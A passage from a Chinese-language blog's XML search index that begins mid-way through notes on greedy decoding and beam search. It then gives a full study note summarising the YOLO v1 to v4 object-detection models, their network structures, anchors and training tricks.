title="概率分布"><ul><li>Greedydecoding：由于模型每个时间步只产生一个输出，我们这样看待：模型是从概率分布中选择概率最大的词，并且丢弃其他词。这种方法叫做贪婪解码（greedydecoding）。</li><li>Beamsearch：每个时间步保留k个最高概率的输出词，然后在下一个时间步，根据上一个时间步保留的k个词来确定当前应该保留哪k个词。假设k=2，第一个位置概率最高的两个输出的词是”I“和”a“，这两个词都保留，然后根据第一个词计算第2个位置的词的概率分布，再取出第2个位置上2个概率最高的词。对于第3个位置和第4个位置，我们也重复这个过程。这种方法称为集束搜索(beamsearch)。</li></ul>]]></content>
    
    
    <categories>
      
      <category>深度学习</category>
      
      <category>自然语言处理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Datawhale组队学习</tag>
      
      <tag>NLP入门</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Yolo</title>
    <link href="/2021/09/01/Models/Yolo/"/>
    <url>/2021/09/01/Models/Yolo/</url>
    
    <content type="html"><![CDATA[<h1 id="yolo-v1">Yolo V1</h1><h2 id="简介">简介</h2><p>在Yolov1提出之前，R-CNN算法在目标领域独占鳌头，但由于R-CNN的网络结构是双阶段(twostage)的特点，使得它的检测速度不能满足实时性。2016年，JosephRedmon、Santosh Divvala、RossGirshick等人提出了一种单阶段（one-stage）的目标检测网络。它的检测速度非常快，每秒可以处理45帧图片，能够轻松地实时运行。由于其速度之快和其使用的特殊方法，作者将其取名为：YouOnly Look Once</p><p>YOLO的核心思想就是把目标检测转变成一个<strong>回归问题</strong>，利用整张图作为网络的输入，仅仅经过一个神经网络，得到boundingbox（边界框） 的位置及其所属的类别。</p><img src="/2021/09/01/Models/Yolo/image-20210901165626159.png" class="" title="image-20210901165626159"><span id="more"></span><h2 id="实现细节">实现细节</h2><h3 id="检测策略">检测策略</h3><ul><li>将一幅图像分成 S×S个网格（grid cell），若某个 object的中心落在这个网格中，则这个网格就负责预测这个object。</li><li>每个网格要预测 B 个bounding box，每个 bounding box 要预测 (x, y, w,h) 和 confidence 共5个值。</li><li>每个网格还要预测一个类别信息，记为 C 个类。</li><li>总的来说，S×S 个网格，每个网格预测 B个bounding box ，预测 C个类。网络输出就是一个 S × S × (5×B+C) 的张量。</li></ul><h3 id="目标损失函数">目标损失函数</h3><img src="/2021/09/01/Models/Yolo/image-20210901165701134.png" class="" title="image-20210901165701134"><ul><li>损失由三部分组成，分别是：坐标预测损失，置信度损失，类别预测损失</li></ul><h1 id="yolo-v2">Yolo V2</h1><h2 id="简介-1">简介</h2><p>更快更准</p><ul><li>重点解决Yolo v1 召回率和定位精度方面的不足</li><li>可以接受不同尺寸的图片输入</li><li>引进Anchor机制</li></ul><h2 id="网络结构">网络结构</h2><p>Yolo v2采用Darknet-19作为特征提取网络</p><img src="/2021/09/01/Models/Yolo/image-20210901170536157.png" class="" title="image-20210901170536157"><ul><li>使用多个3*3卷积核</li><li>在每一层的卷积之后，都增加了Batch Normalization进行预处理</li><li>采用了<strong>降维</strong>的思想，把1x1的卷积置于3x3之间，用来压缩特征</li></ul><h2 id="改进方法">改进方法</h2><h3 id="batch-normalization">Batch Normalization</h3><p>BatchNormalization简称BN，即批量标准化，对数据进行预处理，能够提高训练速度，提升训练效果。</p><figure><imgsrc="https://img-blog.csdnimg.cn/20200728191358184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dqaW5qaWU=,size_16,color_FFFFFF,t_70#pic_center"alt="在这里插入图片描述" /><figcaption aria-hidden="true">在这里插入图片描述</figcaption></figure><h3 id="引入anchor-box机制">引入Anchor Box机制</h3><p>引入Anchor Box锚框机制，加快前期网络训练收敛速度</p><img src="/2021/09/01/Models/Yolo/image-20210901171156371.png" class="" title="image-20210901171156371"><h3 id="convolution-with-anchor-boxes">Convolution With AnchorBoxes</h3><p>Yolov1中，一张图片被分割成7x7网络，当一个网格中同时出现多个类时，就无法检测出所有类，Yolov2做出了相应的改进：</p><ul><li>提高最后的卷积层的输出的分辨率特征</li><li>缩减网络为416x416，使得网络输出的特征图由奇数大小的宽和高，进而使得在划分单元格的时候，只有一个中心单元格，得到的输出是13x13的像素特征</li></ul><h3 id="聚类方法选择anchors">聚类方法选择Anchors</h3><h3 id="fine-grained-features">Fine-Grained Features</h3><p>细粒度特征，可理解为不同层之间的特征融合，从而来提高对小目标的检测能力。</p><h1 id="yolo-v3">Yolo V3</h1><h2 id="简介-2">简介</h2><p>2018年，作者 Redmon 又在 YOLOv2的基础上做了一些改进。特征提取部分采用darknet-53网络结构代替原来的darknet-19，利用特征金字塔网络结构实现了多尺度检测，分类方法使用逻辑回归代替了softmax，在兼顾实时性的同时保证了目标检测的准确性。</p><h2 id="网络结构-1">网络结构</h2><img src="/2021/09/01/Models/Yolo/image-20210901174713003.png" class="" title="image-20210901174713003"><figure><imgsrc="https://img-blog.csdnimg.cn/2020072912091262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dqaW5qaWU=,size_16,color_FFFFFF,t_70#pic_center"alt="在这里插入图片描述" /><figcaption aria-hidden="true">在这里插入图片描述</figcaption></figure><ul><li>DBL： 一个卷积层、一个批量归一化层和一个LeakyReLU组成的基本卷积单元。</li><li>res unit：输入通过两个DBL后，再与原输入进行add；这是一种常规的残差单元。残差单元的目的是为了让网络可以提取到更深层的特征，同时避免出现梯度消失或爆炸。</li><li>resn： 其中的n表示n个res unit；所以 resn = Zero Padding + DBL + n ×res unit 。</li><li>concat：将darknet-53的中间层和后面的某一层的上采样进行张量拼接，达到多尺度特征融合的目的。这与残差层的add操作是不一样的，拼接会扩充张量的维度，而add直接相加不会导致张量维度的改变。</li><li>Y1、Y2、Y3： 分别表示YOLOv3三种尺度的输出。</li></ul><h2 id="改进方法-1">改进方法</h2><h3 id="多尺度预测">多尺度预测</h3><p>YOLOv3选择了三种不同shape的Anchors，同时每种Anchors具有三种不同的尺度，一共9种不同大小的Anchors</p><figure><img src="https://img-blog.csdnimg.cn/20200729133801417.png#pic_center"alt="在这里插入图片描述" /><figcaption aria-hidden="true">在这里插入图片描述</figcaption></figure><h3 id="损失函数">损失函数</h3><figure><imgsrc="https://img-blog.csdnimg.cn/20200729140413942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dqaW5qaWU=,size_16,color_FFFFFF,t_70#pic_center"alt="在这里插入图片描述" /><figcaption aria-hidden="true">在这里插入图片描述</figcaption></figure><h3 id="多标签分类">多标签分类</h3><p>YOLOv3在类别预测方面将YOLOv2的单标签分类改进为多标签分类，在网络结构中将YOLOv2中用于分类的softmax层修改为逻辑分类器</p><h1 id="yolo-v4">Yolo V4</h1><h2 id="简介-3">简介</h2><p>Yolo系列的作者Redmon处于道德方面的考虑，声明不再进行相关的工作，但AlexeyBochkovskiy等人与Redmon取得联系，正式将他们的研究命名为YOLOv4。</p><p>Yolo V4是一个高效而强大的目标检测网络，更加适合在单GPU上训练</p><h2 id="网络结构-2">网络结构</h2><figure><imgsrc="https://img-blog.csdnimg.cn/20200730004622368.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dqaW5qaWU=,size_16,color_FFFFFF,t_70#pic_center"alt="在这里插入图片描述" /><figcaption aria-hidden="true">在这里插入图片描述</figcaption></figure><p>Yolo V4的网络结构是由CSPDarknet53，SPP， PANet，Yolo V3头部等组成</p><h3 id="cspdarknet53">CSPDarknet53</h3><p>CSPNet全称是Cross Stage Partial Network,CSPNet的主要目的是能够实现更丰富的梯度组合，同时减少计算量。这个目标是通过将基本层的特征图分成两部分，然后通过一个跨阶段的层次结构合并它们来实现的。</p><ul><li><p>将原来的Darknet53与CSPNet进行结合</p></li><li><p>使用Mlsh激活函数代替了原来的Leaky RELU</p><figure><imgsrc="https://img-blog.csdnimg.cn/20200730123306142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dqaW5qaWU=,size_16,color_FFFFFF,t_70#pic_center"alt="在这里插入图片描述" /><figcaption aria-hidden="true">在这里插入图片描述</figcaption></figure></li></ul><h3 id="spp">SPP</h3><p>SPP最初的设计目的是用来使卷积神经网络不受固定输入尺寸的限制。在YOLOv4中，作者引入SPP，是因为它显著地增加了感受野，分离出了最重要的上下文特征，并且几乎不会降低的YOLOv4运行速度。</p><h3 id="panet">PANet</h3><img src="/2021/09/01/Models/Yolo/image-20210902163515179.png" class="" title="image-20210902163515179"><ul><li><strong>FPN</strong>主要通过融合高底层特征提升目标检测的效果，尤其是可以提高小尺寸目标的检测效果。</li><li><strong>Bottom-up PathAugmentation</strong>的引入主要是考虑网络浅层特征信息对于实例分割非常重要，因为浅层特征一般是边缘形状等特征。</li><li><strong>Adaptive FeaturePooling</strong>用来特征融合。也就是用每个ROI提取不同层的特征来做融合，这对于提升模型效果显然是有利无害。</li><li><strong>Fully-connectedFusion</strong>是针对原有的分割支路（FCN）引入一个前背景二分类的全连接支路，通过融合这两条支路的输出得到更加精确的分割结果。</li></ul><h2 id="tricks">Tricks</h2><h3 id="bag-of-freebies">Bag of freebies</h3><p>以数据增强方法为例，虽然增加了训练时间，但不增加推理时间，并且能让模型泛化性能和鲁棒性更好。</p><h2 id="改进方法-2">改进方法</h2><h3 id="mosaic">Mosaic</h3><p>作者提出的一种数据增强方法，使用四张图片进行拼接</p><h3 id="sat">SAT</h3><p>SAT是一种自对抗训练数据增强方法，这一种新的对抗性训练方式。在第一阶段，神经网络改变原始图像而不改变网络权值。以这种方式，神经网络对自身进行对抗性攻击，改变原始图像，以制造图像上没有所需对象的欺骗。在第二阶段，用正常的方法训练神经网络去检测目标。</p><h3 id="cmbn">CmBN</h3><p>CmBN的全称是Cross mini-BatchNormalization，定义为跨小批量标准化（CmBN）。CmBN 是 CBN的改进版本，它用来收集一个batch内多个mini-batch内的统计数据。</p><p><em>该文章为记录自己的学习，不做任何商业用途</em></p><p><em>参考文章：<ahref="https://ai-wx.blog.csdn.net/article/details/107509243">YOLO系列算法精讲：从yolov1至yolov4的进阶之路（2万字超全整理，建议收藏！）不积跬步，无以至千里！-CSDN博客yolo系列算法</a></em></p><p><em>如有侵权，请立刻联系，我将即刻删除相关内容</em></p>]]></content>
    
    
    <categories>
      
      <category>深度学习</category>
      
      <category>计算机视觉</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Yolo</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
